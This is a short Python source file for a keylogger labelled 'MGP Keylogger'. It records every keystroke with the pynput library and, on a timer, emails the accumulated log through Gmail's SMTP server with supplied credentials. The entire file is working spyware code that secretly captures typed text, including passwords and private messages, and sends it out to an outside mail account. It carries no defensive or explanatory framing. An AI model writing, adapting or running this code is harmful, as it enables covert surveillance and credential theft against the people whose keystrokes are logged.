#!usr/bin/env python
import smtplib
import pynput.keyboard as pk
import threading as th


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "MGP Keylogger Started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log += string

    def key_press_processor(self, key):
        current_key = ""
        try:
            current_key += str(key.char)
        except AttributeError:
            if key == key.space:
                current_key += " "
            else:
                current_key = current_key + " " + str(key) + " "
        self.append_to_log(current_key)

    def reporter(self):
        send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = th.Timer(self.interval, self.reporter)
        timer.start()

    def start(self):
        keyboard_listener = pk.Listener(on_press=self.key_press_processor)
        with keyboard_listener:
            self.reporter()
            keyboard_listener.join()


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()
